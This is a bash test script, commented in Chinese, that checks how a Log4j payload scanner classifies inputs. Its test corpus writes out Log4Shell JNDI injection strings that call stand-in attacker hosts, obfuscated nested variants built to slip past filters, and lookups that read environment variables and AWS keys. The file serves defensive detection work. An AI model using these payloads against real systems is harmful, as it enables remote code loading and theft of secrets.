#!/usr/bin/env bash
# ============================================================
# log4j Ragel fcall/fret 状态机测试
# ------------------------------------------------------------
# 断言每个载荷的分类（首个命中即可）：JNDI / SENSITIVE / CHAIN /
# EXPR / NONE。语料与纯 DFA 版 test.sh 对齐，另加 9 层深嵌套
# 用例（纯 DFA 版只能到 4 层，本版靠宿主栈不受此限）。
# usage: test.sh [scan_binary]
# ============================================================
set -u

SCAN="${1:-./log4j_scan_fcall}"
pass=0
fail=0

check() {
    local payload="$1" expect="$2"
    local out ok=1
    out=$("$SCAN" "$payload" 2>&1)
    if [[ "$expect" == "NONE" ]]; then
        printf '%s\n' "$out" | grep -q '(none)' || ok=0
    else
        printf '%s\n' "$out" | grep -q "\[$expect" || ok=0
    fi
    if [[ $ok == 1 ]]; then
        printf '[PASS] %-9s %s\n' "$expect" "$payload"
        pass=$((pass + 1))
    else
        printf '[FAIL] %-9s %s\n' "$expect" "$payload"
        printf '%s\n' "$out" | head -5
        fail=$((fail + 1))
    fi
}

# 直接 JNDI
check '${jndi:ldap://127.0.0.1:1389/a}'               JNDI
check '${jndi:rmi://evil.com/exp}'                    JNDI
check '${jndi:ldaps://evil.com:636/a}'                JNDI
check '${jndi:dns://attacker.example}'                JNDI
check 'GET /q?x=${jndi:ldap://x/a}'                   JNDI
check '${JNDI:LDAP://evil.com/x}'                     JNDI

# 嵌套子语法混淆
check '${${lower:j}ndi:ldap://evil.com/a}'            JNDI
check '${${::-j}ndi:ldap://evil.com/a}'               JNDI
check '${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://x}' JNDI
check '${env:${jndi:ldap://evil.com/a}}'              JNDI
check '${jndi:${lower:l}dap://evil.com/a}'            JNDI
check '${lower:${jndi:rmi://x/y}}'                    JNDI
check '$${jndi:ldap://evil.com/a}'                    JNDI

# 敏感前缀
check '${env:HOME}'                                   SENSITIVE
check '${sys:java.version}'                           SENSITIVE
check '${docker:containerId}'                         SENSITIVE
check '${aws:accessKey}'                              SENSITIVE

# 嵌套链 / 结构识别
check '${lower:${upper:${env:PATH}}}'                 CHAIN
check '${a:${b:${c:${d:${e:1}}}}}'                    CHAIN
# 9 层深嵌套：fcall 版靠宿主栈支持，纯 DFA 版（4 层上限）做不到
check '${a:${b:${c:${d:${e:${f:${g:${h:${i:${j:1}}}}}}}}}}' CHAIN
check '${java:version}'                               EXPR
check '${date:MM-dd-yyyy}'                            EXPR
check '${x${date:y}}'                                 EXPR

# 负样本
check 'hello world'                                   NONE
check 'user=jndi'                                     NONE

# 多表达式：任一命中 JNDI 即可
check '${env:HOME} ${jndi:ldap://x}'                  JNDI

echo
echo "summary: $pass passed, $fail failed"
[[ $fail == 0 ]]
